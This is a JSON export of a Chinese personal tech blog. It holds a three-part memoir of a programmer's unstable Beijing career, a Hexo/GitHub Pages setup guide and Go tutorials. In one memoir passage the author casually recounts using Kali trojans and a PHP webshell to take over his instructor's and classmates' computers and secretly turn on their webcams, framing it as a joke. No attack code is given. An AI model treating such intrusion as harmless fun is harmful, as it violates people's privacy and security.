{"meta":{"title":"JWang的博客","subtitle":"一点记录和想法，分享并成长","description":"PHP、Golang、Linux、Web开发","author":"Ben Jun","url":"https://wangbjun.github.io","root":"/"},"pages":[{"title":"所有分类","date":"2020-01-07T11:22:04.000Z","updated":"2020-01-21T15:13:38.081Z","comments":false,"path":"categories/index.html","permalink":"https://wangbjun.github.io/categories/index.html","excerpt":"","text":""},{"title":"关于","date":"2020-01-07T11:21:55.000Z","updated":"2020-01-21T15:13:28.061Z","comments":false,"path":"about/index.html","permalink":"https://wangbjun.github.io/about/index.html","excerpt":"","text":"欢迎光临博客，Welcome… Email: wangbenjun@gmail.com Github: https://wangbjun.github.io"},{"title":"所有标签","date":"2020-01-07T11:22:03.000Z","updated":"2020-01-21T15:13:38.073Z","comments":false,"path":"tags/index.html","permalink":"https://wangbjun.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"一个野生程序员的北漂回忆录（三）","slug":"2019-3","date":"2020-01-22T06:43:14.000Z","updated":"2020-02-02T12:16:52.490Z","comments":true,"path":"2020/01/22/2019-3/","link":"","permalink":"https://wangbjun.github.io/2020/01/22/2019-3/","excerpt":"上篇文章说到我二家公司由于经营不善，濒临倒闭，拖欠工资，最终我选择自离找工作。 2018年03月，这次找工作非常顺序，我请假面了大概5个公司拿到2个offer，最后选择了一家我觉得还可以的公司，xx网，工资15k。 xx网实际上是某大型教育公司下面一个部门的网站，专门面向程序员，并不是公司名字，很多学习编程的同学应该看过他们网站的课程。 之前也看过他们网站的课程，觉得很不错，这个部门有100多人，其中技术40多人，在这家公司的上班体验总体还不错，除了每天早上无聊的站会以及每周周会，公司属于业务驱动型，大多做的一些业务开发。 直到2018年底春节放假那天，技术老大拉我进屋，悄悄告诉我，经过公司决定，你今年没有年终奖，我当时一脸懵逼，问他为什么？","text":"上篇文章说到我二家公司由于经营不善，濒临倒闭，拖欠工资，最终我选择自离找工作。 2018年03月，这次找工作非常顺序，我请假面了大概5个公司拿到2个offer，最后选择了一家我觉得还可以的公司，xx网，工资15k。 xx网实际上是某大型教育公司下面一个部门的网站，专门面向程序员，并不是公司名字，很多学习编程的同学应该看过他们网站的课程。 之前也看过他们网站的课程，觉得很不错，这个部门有100多人，其中技术40多人，在这家公司的上班体验总体还不错，除了每天早上无聊的站会以及每周周会，公司属于业务驱动型，大多做的一些业务开发。 直到2018年底春节放假那天，技术老大拉我进屋，悄悄告诉我，经过公司决定，你今年没有年终奖，我当时一脸懵逼，问他为什么？ 他吞吞吐吐说因为什么线上bug，但是也说不清楚，说只是通知我一声，怕我不了解情况以为漏发了。 后来得知不止我一个人，总共有好几个人都没有年终奖，据老员工透露一般没有年终奖的过完年会给n+1，意思就是过完年裁员会给n+1赔偿，公司也不是第一次这样干。 其实裁员我可以理解，为什么都是我们年初刚入职的员工呢？了解才得知原来整个公司去年早就换血了，只剩下几个小组leader老员工，其它都是新来的。 我更不理解，虽然这一年我表现不算突出，但也算是兢兢业业，努力工作，为什么选择我呢？我想过很多原因，直到离职后来听一个同事说，公司给他们涨薪了，但是名额有限，老大给他自己河南老乡全部涨了… 我平时大多数都是埋头写代码，不擅长在领导面前表现，一年下来基本上没有和老大聊过天，更别说其它的事情了，如果说bug的话，写代码谁没有bug。 这时候我突然想起来公司年初的骚操作，年初公司入职的人非常多，正常是3个月试用期，然而就在试用期快结束的时候，有几个同事被告知试用期不合格，被辞退，我在办的入职他们在办离职。如果不合适就不要招人进来，招人之后干了3个月最后一天辞退，这种行为实在恶心。 过完年回来之后，我在忙完手头的工作，拿了2个月补偿就走了，对这种公司我没有什么留恋，也不想多待一天。 公司有一个同事和我比较熟，后来聊天的时候他说他工资比较低，只有12k，老大过年前和他说年后给他涨工资，但是一直到次年6月份都没有兑现，最后他也走了。 后来才得知，这家公司，负责这个项目的老大是销售出身，集团公司给我们部门定了销售KPI，由于远远没有达到预期目标，所以就拿技术开刀，不是第一次这样了，每年都会裁人招人，公司的文化就是这样，谁遇到谁倒霉。 本以为这是一个拥有2000多人的公司，应该会稳定点，没想到我又栽了，又得重新找工作了。 2019年03月，我重新整理了简历，开始了面试，这时候招聘市场早一年不如一年了，非常艰难，我的直属领导其实还挺好，找关系给我内推了，也给了offer，虽然最后我没去那家公司。 面了半月，拿到几个offer，有些薪资太低就没去了，有些是因为公司太小，不想去创业公司了。最终去了一家互联网金融集团下面的子公司，这家公司技术团队有200多人，我们部门有15个人，从技术团队建设上说，这家公司其实非常不错，比我去过的所有公司都要好。 刚入职那会我对p2p还没什么概念，虽然也看了新闻，知道国家一直在管理规范p2p，清退一些不合格企业，但是这个公司借贷规模上百亿，也是上市公司，论体量也属于头部公司了，应该没问题。 2019年07月，董事长突然来公司给大家开了一个临时会议，给大家透露了一些情况，主要就是说政策又变了，公司非常难，他在努力解决困难，公司平台遭到挤兑，暂停提现了，如果大家有人要走，他也不拦着。这时候我才知道事情的严峻性，国家可能不会给p2p活路了。 一直在公司被抓之前，公司陆续有人离职，也在陆续招人，我们部门走了2个，我心里知道其实早就会有这一天，只是时间问题，但是我没有选择走，一方面是我们部门领导对我还行，中间还给我提了一次涨薪，虽然不多，还有就考虑到我刚来公司不久离职工作也不好找工作，决定再坚持一段时间，心想至少等过完年再看吧。 那会公司依然正常运行，工资不仅没有拖欠，经常还提前发，公司还给所有人都买了商业医疗补充保险，一切正常，谁也不知道哪一天什么时候到来。 2019年12月，早上，我还在地铁上，有人在公司群里说公司下面有好几辆警车，还有大巴，让我们先不要进公司，出事了。有些早上到公司的同事电话也打不通，谁也不知道是什么情况，直到下午5点某地公安局在网上发了一个蓝色通告，坐实被抓了。 后来得知，那些同事都被警察安排坐在工位上，没收手机电脑，上厕所有人跟着，中午吃的盒饭，最终下午6点多的时候才放出来，公司所有电脑无论个人还是公司的，全部被查封带走调查了。 领导让我们在家等消息，其实大家心里都清楚，基本上是完了，接连不断的新闻告诉我们，即使公司没有问题，p2p也是完了。。。 其实公司有没有问题我真不知道，有人担心作为公司员工会被追缴工资，这一点暂时还不确定，目前案件还在审理中，我也是受害者，我还在里面投资了1万多，也一样没有拿出来。 就这样，我又失业了… 这几年，不知道是不是该说运气不好，之前的创业公司倒闭很正常，但是最近2年的公司也很大，结局却一样悲惨，正如很多人说的垃圾公司毁一生，选择很重要，你不知道你进的公司是什么公司，特别是很多不出名的中小型公司，你也不知道你会遇到什么样的领导。 我知道以我现在的简历，很多公司都过不了，跳槽频繁，工作不稳定，再加上非科班出身，出路很少！ 我对自己的评价是工作态度认真负责、学习理解能力强，但是我并不是大牛，并不是那种可以手撸算法、精通各种源码和原理的技术大佬。 虽然这些年很多叫我大佬，但我知道那也只是客气话，技术这行了解的越多会发现你不会的更多，而且对于互联网技术现在基本上大家已经形成共识：淘汰快。 以前觉得技术很厉害，可以改变世界，现在觉得改变世界的其实是商业、是资本，技术只不过是商业工具，有时候也充当打手。 这几年一直很焦虑，实际上大部分技术人都是这样，总感觉有太多东西要去学，这个算法那个数据结构、xx架构、xx源码解读，卖课的公众号数不胜数，每天都在贩卖焦虑，看不完的技术视频和文章。。。 我甚至不太想去写代码了，这是一份相当枯燥和无聊的工作，你需要去解读产品的X逼需求，应付领导的傻X检查，去做很多和技术无关的工作！大部分公司并不重视你的代码质量，他们只关心项目进度，能不能按时上线。 最后，就这样吧，谢谢阅读！","categories":[{"name":"生活","slug":"生活","permalink":"https://wangbjun.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"life","slug":"life","permalink":"https://wangbjun.github.io/tags/life/"}]},{"title":"一个野生程序员的北漂回忆录（二）","slug":"2019-2","date":"2020-01-22T01:17:16.000Z","updated":"2020-02-02T12:16:52.502Z","comments":true,"path":"2020/01/22/2019-2/","link":"","permalink":"https://wangbjun.github.io/2020/01/22/2019-2/","excerpt":"上篇文章说到我第一家公司因为融资断裂，发不起工资，解散了。这时候我们开发里面一位大佬，这里我称他为Q哥，他也刚进公司不久，如果按职级分，他应该属于高级开发工程师，平时带我们做项目，也会参与开发，毕竟当时公司开发人员不多。 当时他说他有个朋友给他介绍了一个公司，这公司非常缺人，可以直接带我们过去，不用技术面试，他和老板聊好了，我们过去见一下老板就行了。","text":"上篇文章说到我第一家公司因为融资断裂，发不起工资，解散了。这时候我们开发里面一位大佬，这里我称他为Q哥，他也刚进公司不久，如果按职级分，他应该属于高级开发工程师，平时带我们做项目，也会参与开发，毕竟当时公司开发人员不多。 当时他说他有个朋友给他介绍了一个公司，这公司非常缺人，可以直接带我们过去，不用技术面试，他和老板聊好了，我们过去见一下老板就行了。 第二天，我们几个人和老板在一个大酒店的套房里面见了面，老板看上去比较老，大概50多岁，叼着雪茄和我们聊了一些他的往事人生以及一些商业战略，最后还请我们吃了一顿简餐。 搞定了老板基本上就没问题了，老板想让我们直接入职，但公司的HR不答应，最后还给我们安排了一个HR面试，聊了聊人生以及薪资待遇，我没有要求涨薪，其中有一个小伙伴因为薪资没谈拢最后没去，最终Q哥带着我们上家公司总共不到10人空降了该公司。 后来得知，其实这个公司也不完全是缺人，他们之前有一个不到10人的开发团队，但是项目开发进度缓慢，处于失败的边缘。听说老板花了上百万开了一个盛大的发布会，但是APP还没上线，延期很久，老板非常生气，想把技术团队都开除。 我们空降之后，就立马开始了1个多月的封闭开发，加班加点，Q哥也一直盯着开发进度，最终顺利完成了预期目标。作为奖励，年底整个技术团队获得了一次海南三亚游，次年6月，公司搬入望京SOHO，换了一个非常大的办公室。 后来了解，这老板花钱请了很多大公司的顾问，有几个BAT的技术顾问，也许是出于融资对外宣传需求，给人感觉很强大，而且技术团队之前一直是有这个百度的大佬兼职带队，就是不知道为什么进度缓慢，也没做出什么东西，据说他们之前已经做了一年多了。 APP顺利上线后，看上去公司蒸蒸日上，但运营了几个月后发现并没有什么效果，此时Q哥主要心思不在技术上，甚至说他几乎不管技术，突然搞起运营了，亲自带队搞运营，这也最终导致了他的出走。 公司失败的原因有很多种，可能是这个老头子最终发现很多人都在围着他转，看上的是他的钱并没有用心做事，再加上他本身喜欢对产品指指点点，喜欢按着自己的想法做，比如说根据自己的想法给APP加一个功能，也从不考虑用户，整个公司说是面向老板开发也不过分。 2017年10月，由于业务基本上无增长，而且据说一年花了2000万，老板不想再投钱了，公司开始裁员，裁了几个人，办公室也从望京SOHO搬到望京西很偏的一个小商住两用办公楼，各种福利缩减，刚开始工资还能正常发放，后来每月都要拖欠工资，很多人开始离职。 老板其实挺有钱，早年发家，经常去美国，那边也有业务，家人都在国外，拔过他的背景，也有些黑料，但人并不傻。这次创业应该在我来之前大约2年前就开始了，只不过不是这个公司，这个公司是后来重新注册，应该属于第二波尝试，这样几番折腾，几年下来基本上算是创业失败了。 当时有的人劳动合同到期，公司也表示不再续期，让自己走人，没有什么工作可干，但是公司后面也不再裁员了，但是工资经常拖欠，不能按时发放，等到2018年春节之后，公司很多人都在找工作，我也趁机走了。 不过还有同事没走继续在那边干，听他说后来没走的人每个月工资只发了一半，到最后人基本上都跑光了，可以说结果很悲催。 我上一家公司虽然也是创业公司，但是最后起码好聚好散，但这家公司了老板最终选择故意拖欠工资逼你自己离职，当时很多人说要一起去告公司，不最终还是不了了之。 说到Q哥，我对他非常感激，他人很不错，但是说实话缺少领导力，感激是因为他带我进入这家公司，虽然最后发现是个火坑，但是这也不能怪他，谁也无法预料后来的事情。还有一点不信任是因为他后来的行为，他在这家公司大部分时间并没有管理技术，没有当好CTO，却去插上并扛下运营和产品，最终由于他的运营方案失败，自己出走，留下我们几个人不知所措。 他出走之后却又带着一位同事进入另一家类似公司，而这家公司一直是用比较传统的方法运营，但是其互联网这块是从零开始，老板据说是从华为出来，印象挺深的是我们第一次Q哥带我们和他见面的时候，刚下班还没吃晚饭，他说请我们吃饭，最后带着我们几个人在路边找了家面馆一人吃了一碗面，场面甚是尴尬！ Q哥说他技术入股，先带一个人过去，又拉了一个他以前的同事，等这边搞起来后期我们一起再过去。 可是好景不长，这家公司只持续了几个月，他们第一版东西做完之后，这个华为出来的老板居然打了退堂鼓，不想干了，不仅没有和他们签合同，连工资都一直拖着不发，最后沟通很久说可以搬电脑抵工资。。。结局就是就这么狗血！ 这时候Q哥说又有朋友介绍一家新公司，说这家公司就是为了上市，资金实力雄厚，他以顾问的身份进去，可以推荐我们进去。。。说实话，经过这么多，我有点怕了，怕了创业公司。。。另外对Q哥的信任度也大大降低! Q哥是第一代北漂，比我们大不了多少岁，也是农村出来，但是来的早，赶上了IT行业发展的黄金时代，而且那会北京房价也不高，现在在北京有房有车，老婆孩子都很好，在我看来，算上成功人士了。但他自己好像并不是这么觉得，他觉得自己还没财务自由，总想做点事情出来，30多岁也算年轻，不想写代码，创业是个不错的选择。 但是我其实并不想把所有宝都压在创业上面，我其实想找一个相对稳定的公司，所以后来他让我去他那边公司的时候我犹豫了，我最后决定自己投简历… 虽然很久没有和Q哥聊了，但是知道他一直在创业，现在在做一个教育相关的小程序，希望他早日创业成功！ 这1年多，看尽了创业公司的各种结局，很多小创业公司九死一生，但是结局却各不相同。很多创业公司倒闭并不是因为技术，大部分都是因为商业模式，或者说是运营不起来，没有市场等各种原因，总之，创业难，想创业成功更难。","categories":[{"name":"生活","slug":"生活","permalink":"https://wangbjun.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"life","slug":"life","permalink":"https://wangbjun.github.io/tags/life/"}]},{"title":"一个野生程序员的北漂回忆录（一）","slug":"2019-1","date":"2020-01-21T15:32:27.000Z","updated":"2020-02-02T12:16:52.506Z","comments":true,"path":"2020/01/21/2019-1/","link":"","permalink":"https://wangbjun.github.io/2020/01/21/2019-1/","excerpt":"虽然2020年已经到来，但是真正象征着新的一年的农历新年才刚刚开始，北漂4年多，IT这条路越走越窄，突然萌生出回家的念头，毕竟年龄也不小，算是90后最早一批奔三的人，还未成家，也谈不上立业。 在此回顾一下这些年在北京这几年的职业生涯，作为一种记录，也算是总结吧！ 这些年在北京，工作换了很多个，几乎每年面试一次，微信里面同事倒是加了不少，除了聊的好的几个，大部分再也不联系。住的地方也是一年换一次，住过上下铺、地下室、天通苑、自如、一居室。。。 2016年06月 第一家公司 –&gt; 融资失败、解散 2016年11月 第二家公司 –&gt; 濒临倒闭、欠薪 2018年03月 第三家公司 –&gt; 经营不善、裁员 2019年03月 第四家公司 –&gt; 涉及p2p、查封","text":"虽然2020年已经到来，但是真正象征着新的一年的农历新年才刚刚开始，北漂4年多，IT这条路越走越窄，突然萌生出回家的念头，毕竟年龄也不小，算是90后最早一批奔三的人，还未成家，也谈不上立业。 在此回顾一下这些年在北京这几年的职业生涯，作为一种记录，也算是总结吧！ 这些年在北京，工作换了很多个，几乎每年面试一次，微信里面同事倒是加了不少，除了聊的好的几个，大部分再也不联系。住的地方也是一年换一次，住过上下铺、地下室、天通苑、自如、一居室。。。 2016年06月 第一家公司 –&gt; 融资失败、解散 2016年11月 第二家公司 –&gt; 濒临倒闭、欠薪 2018年03月 第三家公司 –&gt; 经营不善、裁员 2019年03月 第四家公司 –&gt; 涉及p2p、查封 2015年10月，也许是在外漂泊够了（在此之前我一直在从事一份非常自由的工作），腰里揣着几万块钱，我决定来北京，去报名某智的培训班，学习Java。 为什么我要这么做？主要是因为从大学时代开始，我对编程就非常感兴趣，写过一点C，经常喜欢看一些关于计算机和网络的书籍，但是当时没有想过深入的学习，更没有想过毕业后会从事该行业，那时候纯粹是一些兴趣爱好。后在2013年的时候，在网上看到一些自学成才的例子，开始有这个想法，在家里自学过半年Java，买了几本书，也看了不少视频，但是最终因为各种原因并没有实际去找相关工作，曾经考虑过进培训班，但是当时也没钱就打消了这个念头，后来误打误撞去干别的事情了。 现在回想起来，当时犯了一些错：单打独斗、学习效率不高、缺乏自信。主要是缺乏有经验的人指导，如果坚持下去或许是另一种结果，毕竟2013年那会IT的工作很好找，不像现在年年寒冬，各种裁员。 时间回到2015年10月，这时候我已经有一定的经济能力，拥有一份不稳定和明朗的工作，也不知道该干啥去，但是觉得不能一直这么干下去，最终选择来北京培训，这个培训班的学费也从当年的几千块涨到1万多，不过尚可以接受。 不过最终报名的时候我选择了PHP，并没有学习Java，我当时主要是因为有人说PHP适合个人等中小型开发，而Java主要适合大型企业公司，其实现在这个说法也没错，但是当时我并不了解其实国内大厂都是Java的天下，PHP最终走向穷途末路。 由于我几年前学过C和Java，相当于有基础，所以在培训班非常轻松，很多知识似曾相识，甚至觉得老师讲的太无聊，基本上就是照本宣书，填鸭式教学。同时也发现培训班就像高中一样，有很多学习能力超级差的同学，也有学习能力强的人，我旁边有一些让我感觉属于那种怎么教都教不会的人，非常可惜他们听了培训机构的忽悠，花了很多钱，最终可能无法找到工作。 那会我开始研究Linux，天天折腾Ubuntu，还有Kali，最有意思的是我用Kali的木马工具生成一些木马，然后利用PHP一句话木马攻破讲师的电脑，远程控制其电脑，还在其电脑上找到了我们班所有人的信息。还有，比如说控制某些女生的电脑，打开其摄像头。。。不过纯属搞笑娱乐，并没有做一些过分的事情。 在培训的这几个月里面，我真正学到东西不是很多，培训班大部分讲的东西都很基础，而且枯燥，老师每一个知识点写一个demo，缺乏编程思想层次的指导。对我来说最大的意义在于这段培训经历帮我建立了自信，因为我发现在所有的同学中我即使不是能力最强的，也是属于前排，心里对自己的能力有了一个定位。 时间过的很快，半年后，2016年5月，我们开始找工作了，出于无耐，我编了一个1年经验的简历，也有一些同学编了2-3年，还有更过分的则是造假学历、假毕业证，虽然这些都是培训机构默认的常规操作。 我这个人本身就不属于那种会说的人，以前撒谎都会脸红那种，虽然进入社会好几年但是依然无法做到游刃有余，在找了差不多半个月，面试了10几家公司之后终于拿到一个offer，虽然公司不大也是创业公司有10来个开发，但是毕竟是一个开始，工资是12k，社保最低缴纳，对我来说已经很好了，据说在所有的同学中算高的了，可能是因为我有一个本科学历吧，那时候大部分培训的同学都是专科。 那会2016年正是创业潮，初创企业层出不穷，所以市场对开发人员有很大需求，所以像我这种半路出家的非科班选手依然有市场。 第一次正式参加公司的编程开发工作，心里还有点紧张，很努力，不过也基本上都hold住了，然而这段工作并没有维持多久。。。 2016年11月，公司突然撑不住了。我之前一直没有关注这方面的消息，直到某一天老板说公司融资断了，发不起工资了，如果大家继续留下来也没有工资发，晚上一起吃个散伙饭吧！ 那天是当月的20号，公司最后给每个人发了3000块钱，剩下的说先欠着，等哪天融到钱会第一时间给大家发工资，也可以继续回来工作，公司40多号人没有一个人提赔偿的事情，大家吃完饭喝完酒默默走人了，毕竟老板平时为人不错，不摆架子，好聚好散。 这几年一直和其中一个同事有联系，听他说公司并没有倒闭，留了几个老员工做一些维护和少量开发工作，他就是其一。老板也在一直拉投资，客户也一直在增长，那年与其说倒闭，不如说是壮士断臂。在2018年底的时候，他和我说公司拉到了一笔投资，也不多，大概有几百万，公司正在招人扩大规模。我一直相信老板的话，觉得公司融到钱后把欠我们的半个月工资还给我们，事实上，至今老板从未和我们谈过这件事，我也未去询问过。不过我还是非常佩服这位老板的耐心和毅力，祝他早日能创业成功。 在工作了还不到半年的时候，突然间我又失业了，又得重新找工作，但是事情却另有转机。。。","categories":[{"name":"生活","slug":"生活","permalink":"https://wangbjun.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"life","slug":"life","permalink":"https://wangbjun.github.io/tags/life/"}]},{"title":"Hexo+Github搭建免费技术博客","slug":"hexo-github-blog","date":"2020-01-08T04:05:45.000Z","updated":"2020-01-09T07:51:48.660Z","comments":true,"path":"2020/01/08/hexo-github-blog/","link":"","permalink":"https://wangbjun.github.io/2020/01/08/hexo-github-blog/","excerpt":"最近想搭建了一个自己的博客网站，经过调研，最终决定使用Hexo+Github的形式搭建，大概花了3个小时的时间，这里简单记录一下过程，备用。 综述Github提供了一个免费的GIthub Pages功能，简单说就是可以让你存放静态的资源文件，比如css、js、html、image，同时会给你分配一个免费域名，格式：http://xxx.github.io 所以你只需要注册一个Github账号，然后新建一个repository就行了，一毛线都不用花。 由于Github Pages只能托管静态资源，所以像WordPress这类博客肯定是无法运行的，这时候你有2种选择： 手写静态页面，如果是前端大牛可以尝试这样 第三方博客工具生成，如Hexo、jekyll","text":"最近想搭建了一个自己的博客网站，经过调研，最终决定使用Hexo+Github的形式搭建，大概花了3个小时的时间，这里简单记录一下过程，备用。 综述Github提供了一个免费的GIthub Pages功能，简单说就是可以让你存放静态的资源文件，比如css、js、html、image，同时会给你分配一个免费域名，格式：http://xxx.github.io 所以你只需要注册一个Github账号，然后新建一个repository就行了，一毛线都不用花。 由于Github Pages只能托管静态资源，所以像WordPress这类博客肯定是无法运行的，这时候你有2种选择： 手写静态页面，如果是前端大牛可以尝试这样 第三方博客工具生成，如Hexo、jekyll 简单说，Hexo就是一个工具，它可以根据markdown文档自动生成博客的静态HTML页面，同时呢，你还可以一键换主题，网上有很多开源的主题。 Hexo 和 Github这2个完全可以单独使用，但是把2个结合起来就完美了，一个用来生成博客的静态文件，一个用户托管静态资源，服务器和域名都省了。 环境准备 我不会告诉你如何注册Github账号、以及安装使用Git，作为一名编程开发人员应该都会 我其实也不想告诉你如何安装npm和node，但是我还是放个下载地址：https://nodejs.org/zh-cn Hexo应用安装运行环境1npm install -g hexo-cli 安装完成后，在命令行下执行hexo，应该可以看到以下输出： 123456789101112131415161718jwang@jun:~$ hexoUsage: hexo &lt;command&gt;Commands: help Get help on a command. init Create a new Hexo folder. version Display version information.Global Options: --config Specify config file instead of using _config.yml --cwd Specify the CWD --debug Display all verbose messages in the terminal --draft Display draft posts --safe Disable all plugins and scripts --silent Hide output on consoleFor more help, you can use &#39;hexo help [command]&#39; for the detailed informationor you can check the docs: http:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F; 这里只是列出一部分命令，比较重要的就是init，它是用来创建一个新项目 创建博客1hexo init blog 文件夹名字自己起一个，它自动生成一个目录，里面文件如下： 1234567├── _config.yml├── db.json├── package.json├── package-lock.json├── scaffolds├── source└── themes 简单说明一下，比较重要是有_config.yml文件,这是博客的配置，另外themes下是存放主题的目录，还有source下面的 _posts 目录，是博客文章markdown的源文件。 然后我们进入该目录，生成静态文件并启动服务预览一下: 12345cd bloghexo ghexo s 默认启动在本地4000端口，可以通过 -p 指定端口 写博客1hexo new &lt;article-name&gt; 其实有2种方式写文章，一种是使用上述命令 new 一个，它会自动在source目录的_posts里面创建一个markdown文件。另一种就是你自己手动创建。 但是注意，文章头部会有一些注解： 1234title: Hexo+Github搭建免费技术博客date: 2020-01-08 12:05:45tags: Hexocategory: 其它 Hexo在生成静态页面的时候会解析这些注解，然后做一些处理，比如tags是标签、category是文章分类，都会用到。 不要忘记，每次更新文章之后，都需要执行hexo g重新生成静态页面。 部署到GitPages上面介绍如何使用Hexo生成博客，但是这时候只能在本地玩，如果你有自己的服务器的话，也可以不用GitPages，你把生成的静态文件，也就是public目录下的文件部署到你自己的服务器就行了。 如果你想部署到GitPages，那么继续接着看 有一点需要注意，在创建GitPage仓库的时候，仓库名字最好是: 你的用户名.github.io 这种格式，如果不这样其实也行，就是分配的域名有点丑，比如说你仓库名字叫blog，那么域名就会变成 xxx.github.io/blog 打开Hexo的配置文件_config.yml，修改repo为刚创建的仓库地址： 1234deploy: type: git repo: https:&#x2F;&#x2F;github.com&#x2F;YourgithubName&#x2F;YourgithubName.github.io.git branch: master 为了更好的提交代码，我们需要安装一个插件 npm install hexo-deployer-git --save 然后，我们使用hexo d就可以把代码提交到Github仓库了。 等等。。。有人说网上很多文章还说要配置什么ssh秘钥，其实这块我觉得不是必须的，只是为了更方便的提交代码而已，具体步骤这里不再赘述。 更换主题Hexo更换主题特别简单，只需要把主题文件夹clone到themes文件里面，然后修改_config.yml里面的 theme 配置项。 详细的步骤我这里就不解释了，你可以在Github使用 “hexo themes”关键字搜索，然后按照其readme文档说明安装即可，非常简单。 注意事项 如果你配置了ssh秘钥，则必须把deploy配置里的repo配置 https 地址改成 ssh 地址。 很多主题都有一个自己的_config.yml配置文件，里面有一些详细配置，比如是Next这个主题默认没有打开分类和标签项，需自己配置。 如果想实现“阅读全文”这种效果，有2种方式，第一种是需自己在markdown里合适的位置作注解，默认是 &lt;!--more--&gt;，还有一种在主题的配置里面，可以自动根据字数折叠，但是默认不推荐这种方式。 每个主题都有很多自定义的配置项，比如样式、字体、评论、浏览数，很多默认都没开启，可以好好看一下，都有注释。 最重要的一点，所有的东西都是开源的，如果你觉得很多样式或者细节不合适完全可以打开模板修改定制。 最后，如果你闲麻烦，觉得我的博客还可以，想参考一下可以访问我的Github，所有的文件和配置都在里面，欢迎采用。","categories":[{"name":"工具","slug":"工具","permalink":"https://wangbjun.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://wangbjun.github.io/tags/Hexo/"}]},{"title":"解决Golang测试配置文件加载问题","slug":"golang-gin-config","date":"2019-11-19T03:49:25.000Z","updated":"2020-01-08T17:51:03.557Z","comments":true,"path":"2019/11/19/golang-gin-config/","link":"","permalink":"https://wangbjun.github.io/2019/11/19/golang-gin-config/","excerpt":"最近在写Go的项目，使用的框架是Gin，众所周知，Gin是一个比较简单的框架，只提供了核心功能，并没有配置文件模块，所以这块得自己搞了，Go的第三方解析配置的库非常多，无论是ini、yaml、json文件支持都非常好，而且Go的项目一般都是常驻进程的，所以只需要在项目启动的时候解析一次就行可以了。 示例最简单的办法通常就是定义一个全局的配置变量供其它包使用，在init函数里面初始化加载配置文件，示例如下：","text":"最近在写Go的项目，使用的框架是Gin，众所周知，Gin是一个比较简单的框架，只提供了核心功能，并没有配置文件模块，所以这块得自己搞了，Go的第三方解析配置的库非常多，无论是ini、yaml、json文件支持都非常好，而且Go的项目一般都是常驻进程的，所以只需要在项目启动的时候解析一次就行可以了。 示例最简单的办法通常就是定义一个全局的配置变量供其它包使用，在init函数里面初始化加载配置文件，示例如下： 123456789101112131415161718192021222324252627282930313233343536package configimport ( &quot;gopkg.in&#x2F;ini.v1&quot; &quot;log&quot; &quot;os&quot;)var Conf Configtype Config struct &#123; App App&#125;type App struct &#123; Port string Debug string Url string LogFile string&#125;func init() &#123; envFile :&#x3D; &quot;app.ini&quot; conf, err :&#x3D; ini.Load(envFile) if err !&#x3D; nil &#123; log.Panicf(&quot;parse conf file [%s] failed, err: %s&quot;, envFile, err.Error()) &#125; sectionApp :&#x3D; conf.Section(&quot;APP&quot;) Conf.App &#x3D; App&#123; Port: sectionApp.Key(&quot;PORT&quot;).String(), Debug: sectionApp.Key(&quot;DEBUG&quot;).String(), Url: sectionApp.Key(&quot;URL&quot;).String(), LogFile: sectionApp.Key(&quot;LOG_FILE&quot;).String(), &#125; log.Println(&quot;init config file success&quot;)&#125; 默认情况下，入口文件main.go文件都是位于项目根目录下面，和app.ini文件同级，所以这种写法完全没问题。 问题但是当你跑测试用例的时候，而且当这个测试用例并不在项目根目录的时候就会产生问题: 找不到配置文件。 原因很简单，Go的测试用例最佳实践是和被测试的文件放在一起，所以测试文件可能在二级、三级甚至多级目录里面，如下图： 123456789101112131415161718├── app.ini├── config│ ├── Config.go│ └── DataBase.go├── controller│ ├── BaseController.go├── lib│ ├── function│ │ ├── Aes.go│ │ ├── Rsa.go│ │ ├── Rsa_test.go│ │ └── Uuid.go│ ├── httpLogger│ │ └── HttpLogger.go│ └── zlog│ ├── SqlLog.go│ └── ZapLogger.go├── main.go 所以在测试文件的目录下肯定是找不到app.ini的，咋办呢？解决方法有很多 copy一个配置到测试文件。这种方法最简单粗暴，但是太不灵活，测试用例可能在任何目录里面，这样搞有点难受 配置文件路径写成绝对路径。这种方法也不灵活，毕竟每个人的项目目录位置不一样，以后线上部署也麻烦 采用依赖注入的高级写法，测试的时候使用mock的方式注入配置。这种方法可以，也是比较好的方式，但是需要引入依赖注入组件，整个项目的架构需要更改，不推荐使用依赖注入把简单的问题复杂化。 跑测试的时候传入外部参数，依然不够灵活，而且麻烦 这个问题，我思考了很久，最终想了一个足够简单灵活的方式，代码如下： 12345678910111213envFile :&#x3D; &quot;app.ini&quot;&#x2F;&#x2F; 读取配置文件, 解决跑测试的时候找不到配置文件的问题，最多往上找5层目录for i :&#x3D; 0; i &lt; 5; i++ &#123; if _, err :&#x3D; os.Stat(envFile); err &#x3D;&#x3D; nil &#123; break &#125; else &#123; envFile &#x3D; &quot;..&#x2F;&quot; + envFile &#125;&#125;conf, err :&#x3D; ini.Load(envFile)if err !&#x3D; nil &#123; log.Panicf(&quot;parse conf file [%s] failed, err: %s&quot;, envFile, err.Error())&#125; 使用一个for循环解决了这个问题，如果怕不够保险，可以改成10，大多数项目目录应该不会这么深，虽然不够优雅，但是还是相对比较简单的。 各位有什么更好的方法吗？有的话请留言指教","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://wangbjun.github.io/tags/Golang/"}]},{"title":"浅谈Golang的recover异常处理机制","slug":"golang-recover","date":"2019-11-10T12:22:04.000Z","updated":"2020-01-08T17:38:26.393Z","comments":true,"path":"2019/11/10/golang-recover/","link":"","permalink":"https://wangbjun.github.io/2019/11/10/golang-recover/","excerpt":"1.errorGolang被诟病非常多的一点就是缺少强大方便的异常处理机制，大部分高级编程语言，比如Java、PHP、Python等都拥有一种try catch机制，这种异常捕获机制可以非常方便的处理程序运行中可能出现的各种意外情况。 严格来说，在Go里面，错误和异常是2种不同的类型，错误一般是指程序产生的逻辑错误，或者意料之中的意外情况，而且异常一般就是panic，比如角标越界、段错误。","text":"1.errorGolang被诟病非常多的一点就是缺少强大方便的异常处理机制，大部分高级编程语言，比如Java、PHP、Python等都拥有一种try catch机制，这种异常捕获机制可以非常方便的处理程序运行中可能出现的各种意外情况。 